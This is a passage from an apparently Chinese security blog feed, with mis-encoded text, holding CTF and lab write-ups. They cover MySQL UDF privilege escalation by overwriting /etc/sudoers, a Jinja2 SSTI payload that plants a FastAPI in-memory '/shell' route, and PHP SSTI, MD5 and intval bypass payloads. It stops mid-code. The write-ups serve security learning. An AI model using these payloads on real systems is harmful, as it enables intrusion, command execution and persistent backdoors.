class="line"></span><br></pre></td></tr></table></figure><p>ç›´æ¥æˆåŠŸï¼ç°åœ¨æ˜¯ææƒæˆåŠŸäº†ï¼Œä¸ºäº†æ“ä½œæ–¹ä¾¿æˆ‘ä»¬è¿˜æ˜¯æƒ³åœ¨èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯å»æ‰§è¡Œå‘½ä»¤è€Œä¸æ˜¯ç”¨sqlè¯­å¥å»æ‰§è¡Œï¼ä¸€å¼€å§‹æˆ‘çš„æƒ³æ³•ç›´æ¥æ”¹å¯†ç ä¸å°±è¡Œäº†ï¼Œä½†æ˜¯èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯ä¸æ˜¯é¢˜ç›®çš„shellå•Šï¼Œæ²¡æœ‰äº¤äº’å¼ï¼Œå³ä½¿æ”¹äº†å¯†ç ä¹Ÿæ²¡æ³•è¾“å…¥ï¼é‚£ä¹ˆè¿™é‡Œæœ‰å¦å¤–çš„åŠæ³•å°±æ˜¯ç»™www-dataè¿™ä¸ªç”¨æˆ·ä¹Ÿæ·»åŠ ä¸Šsudoï¼</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸è¦å»æ”¹&#x2F;etc&#x2F;sudoersè¿™ä¸ªæ–‡ä»¶çš„æƒé™ï¼Œè¿™ä¸ªæ–‡ä»¶çš„æƒé™å¦‚æœè¿‡äºå®½æ¾çš„è¯å°±ä¼šæ‹’ç»æ‰€æœ‰çš„sudoå‘½ä»¤ï¼Œmysqlçš„ä¹Ÿä¸è¡Œäº†ï¼Œå°±åªèƒ½é‡å¼€é¶æœºå†æ‰“äº†ï¼æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨cpå»è¿›è¡Œæ–‡ä»¶çš„ç§»åŠ¨ï¼</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">åˆ©ç”¨å‰é¢çš„æ–‡ä»¶åŒ…å«å†™å…¥</span><br><span class="line">&lt;?php file<span class="built_in">_</span>put<span class="built_in">_</span>contents(&#x27;sudoers&#x27;,&#x27;root ALL=(ALL) ALL</span><br><span class="line">@includedir /etc/sudoers.d</span><br><span class="line">mysql ALL=(ALL:ALL) NOPASSWD:ALL</span><br><span class="line">www-data ALL=(ALL:ALL) NOPASSWD:ALL&#x27;);?&gt;</span><br><span class="line">ç§»åŠ¨</span><br><span class="line">select sys<span class="built_in">_</span>eval(&#x27;sudo cp /var/www/html/system36d/util/sudoers /etc/sudoers&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/11/12.png"></p><h2 id="å†…ç½‘æ¨ªå‘"><a href="#å†…ç½‘æ¨ªå‘" class="headerlink" title="å†…ç½‘æ¨ªå‘"></a>å†…ç½‘æ¨ªå‘</h2><p><del>æ²¡å¤ªäº†è§£ä¸æ˜¯å¾ˆä¼šæ¬ ç€</del></p>]]></content>
      
      
      <categories>
          
          <category> ctfshowé¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
            <tag> udfææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FastAPIä¸‹çš„å†…å­˜é©¬ï¼ˆæœªå®Œï¼‰</title>
      <link href="/2025/11/03/FastAPI%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/11/03/FastAPI%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>å‰ä¸¤å¤©baoå¸ˆå‚…å‡ºäº†fastapiçš„å†…å­˜é©¬ï¼Œç”±äºè‡ªå·±å­¦è¿‡flaskçš„å†…å­˜é©¬ï¼Œæ‰€ä»¥å‚è€ƒäº†ä¸€ç¯‡æ–‡ç« å¾ˆå¿«å°±æ‰“é€šäº†ï¼ä¸€å¼€å§‹æƒ³ç€åŸç†åº”è¯¥éƒ½å·®ä¸å¤šå§ï¼Œä½†æ˜¯è½¬å¿µä¸€æƒ³é‡è¦çš„åº”è¯¥æ˜¯åˆ†æä»£ç å’Œæ¢ç´¢çš„èƒ½åŠ›ï¼è‡ªå·±è¿™æ–¹é¢çš„èƒ½åŠ›æ¯”è¾ƒå¼±ï¼Œæ‰€ä»¥æ‰“ç®—å†™ç¯‡æ–‡ç« å­¦ä¹ ä¸€ä¸‹ï¼ˆä¸èƒ½é€ƒé¿ï¼‰ï¼</p><h2 id="fastapi-demo"><a href="#fastapi-demo" class="headerlink" title="fastapi demo"></a>fastapi demo</h2><p>fastapiå…¶å®å°±æ˜¯pythonçš„ä¸€ä¸ªæ¡†æ¶ï¼ŒåŠŸèƒ½ç±»ä¼¼äºæ˜¯flaskï¼Œéƒ½æ˜¯ç”¨æ¥åˆ›å»ºwebåº”ç”¨çš„ï¼</p><p>ä¸€ä¸ªç®€å•çš„demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> HTMLResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/hack&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">username=<span class="string">&quot;Guest&quot;</span></span>):</span><br><span class="line">    output = Jinja2.from_string(<span class="string">&quot;Welcome &quot;</span> + username).render()</span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(content=output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> uvicorn</span><br><span class="line">    uvicorn.run(app, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>appæ˜¯FastAPIåº”ç”¨å®ä¾‹ï¼Œæ˜¯æ•´ä¸ªwebåº”ç”¨çš„æ ¸å¿ƒï¼ä½ å¯ä»¥ç®€å•åœ°ç†è§£æˆCPUï¼Œæ‰€ä»¥åé¢æˆ‘ä»¬åé¢æˆ‘ä»¬å»è°ƒç”¨FastAPIçš„ä¸€äº›æ–¹æ³•å•¥çš„éƒ½æ˜¯å…ˆå»æ‰¾å®ƒï¼</p><h2 id="ç»å…¸è·¯çº¿ï¼šè·¯ç”±æ·»åŠ å‡½æ•°"><a href="#ç»å…¸è·¯çº¿ï¼šè·¯ç”±æ·»åŠ å‡½æ•°" class="headerlink" title="ç»å…¸è·¯çº¿ï¼šè·¯ç”±æ·»åŠ å‡½æ•°"></a>ç»å…¸è·¯çº¿ï¼šè·¯ç”±æ·»åŠ å‡½æ•°</h2><p>è·Ÿè¿›è¿‡ç¨‹å‡ºäº†ç‚¹å°æ’æ›²ï¼Œå¥½åœ¨baoå‘Šè¯‰æˆ‘åŠ¨æ€è·Ÿè¿›ï¼èŠ±äº†25å¤§æ´‹ä¸å»ä¸Šè¯¾æ•´å‡ºæ¥çš„ï¼</p><p>é¦–å…ˆæ˜é¢ä¸Šä»£ç é‡Œé¢æ˜¯é€šè¿‡<code>get(&quot;/hack&quot;)</code>è¿™æ ·çš„å½¢å¼å»æ·»åŠ è·¯ç”±çš„ï¼Œä½†åº•å±‚å°±å¦‚æ­¤å—ï¼Ÿæˆ‘ä»¬è·Ÿè¿›<code>get</code></p><p><img src="/images/achieve/2025/11/7.png"></p><p>ç»§ç»­è·Ÿè¿›<code>router</code></p><p><img src="/images/achieve/2025/11/8.png"></p><p>ç»§ç»­è·Ÿè¿›çš„æ—¶å€™å¹¶æ²¡æœ‰å‘ç°<code>get</code>å‡½æ•°çš„å®šä¹‰ï¼ŒçœŸå¥‡æ€ªï¼é™æ€è·Ÿè¿›è€æ˜¯ç›´æ¥åˆ°å®ƒçˆ¶ç±»é‡Œé¢å»äº†ï¼é‚£å°±åŠ¨æ€è·Ÿè¿›å§</p><p><img src="/images/achieve/2025/11/9.png"></p><p>æ‰“å¥½æ–­ç‚¹è°ƒè¯•å‘ç°</p><p><code>self.router.get</code>è¿™ä¸ªè°ƒç”¨æ˜¯<code>APIRouter</code>è¿™ä¸ªç±»çš„getæ–¹æ³•ï¼Œæœ€ååˆè°ƒç”¨äº†<code>api_route</code>ç»§ç»­è·Ÿè¿›</p><p><img src="/images/achieve/2025/11/10.png"></p><p>è¿™é‡Œé—­åŒ…äº†è¿”å›çš„æ˜¯è¢«è£…é¥°äº†çš„å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›<code>add_api_route</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_api_route</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    path: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    endpoint: <span class="type">Callable</span>[..., <span class="type">Any</span>],</span></span><br><span class="line"><span class="params">    *,</span></span><br><span class="line"><span class="params">    response_model: <span class="type">Any</span> = Default(<span class="params"><span class="literal">None</span></span>),</span></span><br><span class="line"><span class="params">    status_code: <span class="type">Optional</span>[<span class="built_in">int</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    tags: <span class="type">Optional</span>[<span class="type">List</span>[<span class="type">Union</span>[<span class="built_in">str</span>, Enum]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    dependencies: <span class="type">Optional</span>[<span class="type">Sequence</span>[params.Depends]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    summary: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    description: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_description: <span class="built_in">str</span> = <span class="string">&quot;Successful Response&quot;</span>,</span></span><br><span class="line"><span class="params">    responses: <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="type">Union</span>[<span class="built_in">int</span>, <span class="built_in">str</span>], <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    deprecated: <span class="type">Optional</span>[<span class="built_in">bool</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    methods: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="type">Set</span>[<span class="built_in">str</span>], <span class="type">List</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    operation_id: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_include: <span class="type">Optional</span>[IncEx] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude: <span class="type">Optional</span>[IncEx] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    response_model_by_alias: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_unset: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_defaults: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    response_model_exclude_none: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    include_in_schema: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    response_class: <span class="type">Union</span>[<span class="type">Type</span>[Response], DefaultPlaceholder] = Default(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="params">        JSONResponse</span></span></span><br><span class="line"><span class="params"><span class="params">    </span>),</span></span><br><span class="line"><span class="params">    name: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    route_class_override: <span class="type">Optional</span>[<span class="type">Type</span>[APIRoute]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    callbacks: <span class="type">Optional</span>[<span class="type">List</span>[BaseRoute]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    openapi_extra: <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    generate_unique_id_function: <span class="type">Union</span>[</span></span><br><span class="line"><span class="params">        <span class="type">Callable</span>[[APIRoute], <span class="built_in">str</span>], DefaultPlaceholder</span></span><br><span class="line"><span class="params">    ] = Default(<span class="params">generate_unique_id</span>),</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    route_class = route_class_override <span class="keyword">or</span> <span class="variable language_">self</span>.route_class</span><br><span class="line">    responses = responses <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">    combined_responses = &#123;**<span class="variable language_">self</span>.responses, **responses&#125;</span><br><span class="line">    current_response_class = get_value_or_default(</span><br><span class="line">        response_class, <span class="variable language_">self</span>.default_response_class</span><br><span class="line">    )</span><br><span class="line">    current_tags = <span class="variable language_">self</span>.tags.copy()</span><br><span class="line">    <span class="keyword">if</span> tags:</span><br><span class="line">        current_tags.extend(tags)</span><br><span class="line">    current_dependencies = <span class="variable language_">self</span>.dependencies.copy()</span><br><span class="line">    <span class="keyword">if</span> dependencies:</span><br><span class="line">        current_dependencies.extend(dependencies)</span><br><span class="line">    current_callbacks = <span class="variable language_">self</span>.callbacks.copy()</span><br><span class="line">    <span class="keyword">if</span> callbacks:</span><br><span class="line">        current_callbacks.extend(callbacks)</span><br><span class="line">    current_generate_unique_id = get_value_or_default(</span><br><span class="line">        generate_unique_id_function, <span class="variable language_">self</span>.generate_unique_id_function</span><br><span class="line">    )</span><br><span class="line">    route = route_class(</span><br><span class="line">        <span class="variable language_">self</span>.prefix + path,</span><br><span class="line">        endpoint=endpoint,</span><br><span class="line">        response_model=response_model,</span><br><span class="line">        status_code=status_code,</span><br><span class="line">        tags=current_tags,</span><br><span class="line">        dependencies=current_dependencies,</span><br><span class="line">        summary=summary,</span><br><span class="line">        description=description,</span><br><span class="line">        response_description=response_description,</span><br><span class="line">        responses=combined_responses,</span><br><span class="line">        deprecated=deprecated <span class="keyword">or</span> <span class="variable language_">self</span>.deprecated,</span><br><span class="line">        methods=methods,</span><br><span class="line">        operation_id=operation_id,</span><br><span class="line">        response_model_include=response_model_include,</span><br><span class="line">        response_model_exclude=response_model_exclude,</span><br><span class="line">        response_model_by_alias=response_model_by_alias,</span><br><span class="line">        response_model_exclude_unset=response_model_exclude_unset,</span><br><span class="line">        response_model_exclude_defaults=response_model_exclude_defaults,</span><br><span class="line">        response_model_exclude_none=response_model_exclude_none,</span><br><span class="line">        include_in_schema=include_in_schema <span class="keyword">and</span> <span class="variable language_">self</span>.include_in_schema,</span><br><span class="line">        response_class=current_response_class,</span><br><span class="line">        name=name,</span><br><span class="line">        dependency_overrides_provider=<span class="variable language_">self</span>.dependency_overrides_provider,</span><br><span class="line">        callbacks=current_callbacks,</span><br><span class="line">        openapi_extra=openapi_extra,</span><br><span class="line">        generate_unique_id_function=current_generate_unique_id,</span><br><span class="line">    )</span><br><span class="line">    <span class="variable language_">self</span>.routes.append(route)</span><br></pre></td></tr></table></figure><p>ä¸ç”¨å…¨éƒ¨çœ‹æ‡‚ï¼Œåªéœ€è¦çŸ¥é“è¿™ä¸ª<code>add_api_route</code>å¯ä»¥ç”¨æ¥æ·»åŠ è·¯ç”±å°±å¥½äº†ï¼æ„é€ payload</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;sys.modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].<span class="built_in">_</span><span class="built_in">_</span>dict<span class="built_in">_</span><span class="built_in">_</span>[&#x27;app&#x27;].router.add<span class="built_in">_</span>api<span class="built_in">_</span>route(&#x27;/shell&#x27;,lambda cmd=&#x27;whoami&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(cmd).read(),methods=[&#x27;GET&#x27;])&quot;)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å¥½äº†ï¼æˆ‘æµ‹è¿‡æ‰“é€šäº†ï¼</p><p><del>æœªå®Œå¾…ç»­</del></p>]]></content>
      
      
      <categories>
          
          <category> pythonå†…å­˜é©¬ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…å­˜é©¬ </tag>
            
            <tag> fastapi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æˆéƒ½å¤§å­¦ç¬¬å…«å±Šç„æ­¦æ¯ï¼ˆakï¼‰</title>
      <link href="/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/"/>
      <url>/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="é”¦å®¶æœ‰ä»€ä¹ˆ"><a href="#é”¦å®¶æœ‰ä»€ä¹ˆ" class="headerlink" title="é”¦å®¶æœ‰ä»€ä¹ˆ"></a>é”¦å®¶æœ‰ä»€ä¹ˆ</h2><p>æŸ¥çœ‹æºç å‘ç°&#x2F;try_a_try</p><p><img src="/images/achieve/2025/11/1.png"></p><p>ç›´æ¥çŒœå‚æ•°æ˜¯nameæœçœŸï¼æœç„¶ä¹Ÿæ˜¯sstiç›´æ¥ç§’äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">try<span class="built_in">_</span>a<span class="built_in">_</span>try?name=&#123;&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;tac /f*&#x27;).read()&#125;&#125;</span><br><span class="line">NSSCTF&#123;191c23bd-63f0-4383-8719-15471a3e78e8&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h2><p>è¿™é¢˜å°±ä¸åˆ†æä»£ç äº†ï¼Œ?page&#x3D;&#x2F;flagå°±ç›´æ¥ç§’äº†ï¼æœ‰ä¸ªåŠ å¼ºç‰ˆçš„ï¼Œå¾…ä¼šç›´æ¥å°±åœ¨é‚£é¢˜åˆ†æä»£ç äº†ï¼</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;216a17fb-19f6-49e7-863b-bd0eb63d86b7&#125;</span><br></pre></td></tr></table></figure><h2 id="normal-php"><a href="#normal-php" class="headerlink" title="normal_php"></a>normal_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>]!==<span class="variable">$c</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>[<span class="string">&#x27;cdusec&#x27;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="variable">$num1</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="variable">$num2</span>=<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="number">10520</span>,<span class="variable">$b</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è®°ä½è¿™ä¸ªæ•°&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿™éƒ½è®°ä¸ä½?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num2</span>==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;æˆ‘ä¸æƒ³è¦è¿™ä¸ªæ•°å­—!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³åå…­è¿›åˆ¶ç»•è¿‡?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$num2</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³å…«è¿›åˆ¶ç»•è¿‡?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num2</span>,<span class="number">0</span>)==<span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;å¥½äº†ä½ å¯ä»¥å»ä¸‹ä¸€å…³äº†&quot;</span>.<span class="variable">$next</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ç°åœ¨åˆæƒ³è¦äº†,å˜»å˜»&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¸er,md5ä½ ä¸ä¼š&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä½ çœ‹çœ‹ä¼ ä»€ä¹ˆå‘¢&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>parse_str($a,$b);</code>å°†å­—ç¬¦ä¸²$aè§£ææˆæ•°ç»„å­˜å…¥$b</p><p><code>if(strpos($num2, &quot;0&quot;))</code>0åœ¨ç¬¬ä¸€ä½è¿”å›çš„å°±æ˜¯0ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥8è¿›åˆ¶ç»•è¿‡</p><p>payloadï¼ˆ&amp;è¦urlç¼–ç ä¸ç„¶å°±ä¼šè¢«è®¤ä¸ºæ˜¯å‚æ•°åˆ†å‰²ç¬¦ï¼‰</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=cdusec=QNKCDZO<span class="comment">%26num[]=10520%26num[]=0337522</span></span><br><span class="line">post:</span><br><span class="line">c=240610708</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå…³&#x2F;leeevvvel2222222.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flagåœ¨/flagä¸­ï¼Œè¯•ç€è¯»è¯»?</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span 